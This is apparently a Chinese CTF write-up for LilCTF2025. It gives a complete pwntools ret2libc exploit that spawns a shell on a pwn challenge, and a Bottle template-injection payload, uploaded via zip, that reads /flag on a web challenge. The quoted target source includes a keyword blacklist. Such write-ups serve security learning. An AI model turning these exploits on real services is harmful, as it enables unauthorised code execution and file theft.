# [个人队伍] LilCTF2025的Writeup

> **2025年8月17日20:00 ~ 2029年12月14日6:10**
>
> **比赛地址：https://gz.imxbt.cn/games/30/challenges**
>
> **复现地址：https://gz.imxbt.cn/games/30/challenges**

> 个人赛
>
> # LilCTF2025
>
> **663**支队伍已报名
>
> 开始时间
>
> 2025年8月17日晚上8点00分
>
> 结束时间
>
> 2029年12月14日晚上6点10分
>
> [LilCTF2025Github仓库](https://github.com/Lil-House/LilCTF-2025)
>
> flag格式为: LILCTF{}
>
> [WP点我](https://lil-house.feishu.cn/wiki/N7EIwqpoEiVngqkV8rzcgPB9nPg)
>
> LILCTF{Me4n1ngFu1_w0rDs}



# All

## Pwn

### 签到

#### 题目信息

> ## 签到251 pts
>
> **出题**：gets
>
> **难度**：签到
>
> 这就得看谁手速快了

#### 解题过程

##### 查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[112]; // [rsp+0h] [rbp-70h] BYREF

  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  puts("Welcome to lilctf!");
  puts("What's your name?");
  read(0, buf, 0x200u);
  return 0;
}
```

**分析**

- **栈溢出**
- **ret2libc**

##### 编写脚本

```python
from pwn import *
from LibcSearcher import LibcSearcher

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("challenge.imxbt.cn", 30961)
# r = process(["./pwn"])

elf = ELF("./pwn")
rop = ROP([elf])

payload = cyclic(0x70)
payload += p64(0xdeadbeef)
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(elf.sym["main"])
r.sendafter("name?\n".encode(), payload)

puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
print("puts_got_libc_addr", hex(puts_got_libc_addr))

time.sleep(1)

payload = cyclic(0x70)
payload += p64(0xdeadbeef)
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(elf.got["read"]) + p64(elf.plt["puts"]) + p64(elf.sym["main"])
r.sendafter("name?\n".encode(), payload)

read_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
print("read_got_libc_addr", hex(read_got_libc_addr))

libc = LibcSearcher("puts", puts_got_libc_addr)
libc.add_condition("read", read_got_libc_addr)
# libc.select_libc(0)

puts_got_libc_offset = libc.dump("puts")
libc_base_addr = puts_got_libc_addr - puts_got_libc_offset
print("libc_base_addr", hex(libc_base_addr))

system_libc_addr = libc_base_addr + libc.dump("system")
bin_sh_libc_addr = libc_base_addr + libc.dump("str_bin_sh")

payload = cyclic(0x70)
payload += p64(0xdeadbeef)
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(bin_sh_libc_addr) + p64(rop.find_gadget(["ret"])[0]) + p64(system_libc_addr)
r.sendafter("name?\n".encode(), payload)

r.interactive()
r.close()
```

##### 发起攻击

```shell
python exp.py
```

```shell
[*] Switching to interactive mode
$ ls
bin
dev
flag
lib
lib64
vuln
$ cat flag
LILCTF{a3e8ff37-38a6-49f1-b05f-1888ee8d7ee1}
```

#### 题目答案

##### 最终脚本

```python
from pwn import *
from LibcSearcher import LibcSearcher

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("challenge.imxbt.cn", 30961)
# r = process(["./pwn"])

elf = ELF("./pwn")
rop = ROP([elf])

payload = cyclic(0x70)
payload += p64(0xdeadbeef)
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(elf.got["puts"]) + p64(elf.plt["puts"]) + p64(elf.sym["main"])
r.sendafter("name?\n".encode(), payload)

puts_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
print("puts_got_libc_addr", hex(puts_got_libc_addr))

time.sleep(1)

payload = cyclic(0x70)
payload += p64(0xdeadbeef)
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(elf.got["read"]) + p64(elf.plt["puts"]) + p64(elf.sym["main"])
r.sendafter("name?\n".encode(), payload)

read_got_libc_addr = u64(r.recvuntil('\x7f'.encode())[-6:].ljust(8, '\x00'.encode()))
print("read_got_libc_addr", hex(read_got_libc_addr))

libc = LibcSearcher("puts", puts_got_libc_addr)
libc.add_condition("read", read_got_libc_addr)
# libc.select_libc(0)

puts_got_libc_offset = libc.dump("puts")
libc_base_addr = puts_got_libc_addr - puts_got_libc_offset
print("libc_base_addr", hex(libc_base_addr))

system_libc_addr = libc_base_addr + libc.dump("system")
bin_sh_libc_addr = libc_base_addr + libc.dump("str_bin_sh")

payload = cyclic(0x70)
payload += p64(0xdeadbeef)
payload += p64(rop.find_gadget(["pop rdi", "ret"])[0]) + p64(bin_sh_libc_addr) + p64(rop.find_gadget(["ret"])[0]) + p64(system_libc_addr)
r.sendafter("name?\n".encode(), payload)

r.interactive()
r.close()
```

##### 得到答案

```shell
LILCTF{a3e8ff37-38a6-49f1-b05f-1888ee8d7ee1}
```



## Web

### ez_bottle

#### 题目信息

> ## ez_bottle250 pts
>
> **出题**：0raN9e
>
> **难度**：简单
>
> 能顺利帮瓶子回去嘛

#### 解题过程

##### 查看源码

```python
from bottle import route, run, template, post, request, static_file, error
import os
import zipfile
import hashlib
import time

# hint: flag in /flag , have a try

UPLOAD_DIR = os.path.join(os.path.dirname(__file__), 'uploads')
os.makedirs(UPLOAD_DIR, exist_ok=True)

STATIC_DIR = os.path.join(os.path.dirname(__file__), 'static')
MAX_FILE_SIZE = 1 * 1024 * 1024

BLACK_DICT = ["{", "}", "os", "eval", "exec", "sock", "<", ">", "bul", "class", "?", ":", "bash", "_", "globals",
              "get", "open"]


def contains_blacklist(content):
    return any(black in content for black in BLACK_DICT)


def is_symlink(zipinfo):
    return (zipinfo.external_attr >> 16) & 0o170000 == 0o120000


def is_safe_path(base_dir, target_path):
    return os.path.realpath(target_path).startswith(os.path.realpath(base_dir))


@route('/')
def index():
    return static_file('index.html', root=STATIC_DIR)


@route('/static/<filename>')
def server_static(filename):
    return static_file(filename, root=STATIC_DIR)


@route('/upload')
def upload_page():
    return static_file('upload.html', root=STATIC_DIR)


@post('/upload')
def upload():
    zip_file = request.files.get('file')
    if not zip_file or not zip_file.filename.endswith('.zip'):
        return 'Invalid file. Please upload a ZIP file.'

    if len(zip_file.file.read()) > MAX_FILE_SIZE:
        return 'File size exceeds 1MB. Please upload a smaller ZIP file.'

    zip_file.file.seek(0)

    current_time = str(time.time())
    unique_string = zip_file.filename + current_time
    md5_hash = hashlib.md5(unique_string.encode()).hexdigest()
    extract_dir = os.path.join(UPLOAD_DIR, md5_hash)
    os.makedirs(extract_dir)

    zip_path = os.path.join(extract_dir, 'upload.zip')
    zip_file.save(zip_path)

    try:
        with zipfile.ZipFile(zip_path, 'r') as z:
            for file_info in z.infolist():
                if is_symlink(file_info):
                    return 'Symbolic links are not allowed.'

                real_dest_path = os.path.realpath(os.path.join(extract_dir, file_info.filename))
                if not is_safe_path(extract_dir, real_dest_path):
                    return 'Path traversal detected.'

            z.extractall(extract_dir)
    except zipfile.BadZipFile:
        return 'Invalid ZIP file.'

    files = os.listdir(extract_dir)
    files.remove('upload.zip')

    return template("文件列表: {{files}}\n访问: /view/{{md5}}/{{first_file}}",
                    files=", ".join(files), md5=md5_hash, first_file=files[0] if files else "nofile")


@route('/view/<md5>/<filename>')
def view_file(md5, filename):
    file_path = os.path.join(UPLOAD_DIR, md5, filename)
    if not os.path.exists(file_path):
        return "File not found."

    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()

    if contains_blacklist(content):
        return "you are hacker!!!nonono!!!"

    try:
        return template(content)
    except Exception as e:
        return f"Error rendering template: {str(e)}"


@error(404)
def error404(error):
    return "bbbbbboooottle"


@error(403)
def error403(error):
    return "Forbidden: You don't have permission to access this resource."


if __name__ == '__main__':
    run(host='0.0.0.0', port=5000, debug=False)

```

**分析**

- ```python
  @post('/upload')
  def upload():
      zip_file = request.files.get('file')
  ```

  支持上传压缩包后解压，**参数是file**

  存在template**模板注入**

  用的是**bottle语法**

  上传会检测文件名**防止路径穿越**

  访问会检测花括号**防止路径穿越**

  会检测并**防止软链接**

##### 编写脚本

**payload.txt**

```python
% import shutil;shutil.copy('/flag', './flag') # %import subprocess; subprocess.call(['cp', '/flag', './flag'])
```

**压缩**

```shell
payload.txt -> payload.zip
```

**上传**

```shell
curl -X POST -F "file=@payload.zip" http://challenge.imxbt.cn:32306/upload
```

```shell
文件列表: payload.txt
访问: /view/f3b56f7e64eaf20409a5e07413afe626/payload.txt
```

**访问**

```shell
http://challenge.imxbt.cn:32306/view/f3b56f7e64eaf20409a5e07413afe626/payload.txt
```

```shell
...
```

**payload.txt**

```python
% include("./flag")
```

**压缩**

```shell
payload.txt -> payload.zip
```

**上传**

```shell
curl -X POST -F "file=@payload.zip" http://challenge.imxbt.cn:32306/upload
```

```shell
文件列表: payload.txt
访问: /view/f3b56f7e64eaf20409a5e07413afe626/payload.txt
```

**访问**

```shell
http://challenge.imxbt.cn:32306/view/f3b56f7e64eaf20409a5e07413afe626/payload.txt
```

```shell
LILCTF{9cd36c43-96b5-471d-96bd-38dc2d33c6c1}
```

#### 题目答案

##### 最终脚本

```python
% import shutil;shutil.copy('/flag', './flag') # %import subprocess; subprocess.call(['cp', '/flag', './flag'])
```

##### 得到答案

```shell
LILCTF{9cd36c43-96b5-471d-96bd-38dc2d33c6c1}
```



# 队伍

## 名称

**菜鸟对对队**



## 口号

**对对对对对**



## 成员

### 队长

- **probie**

### 队员

- **probie**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**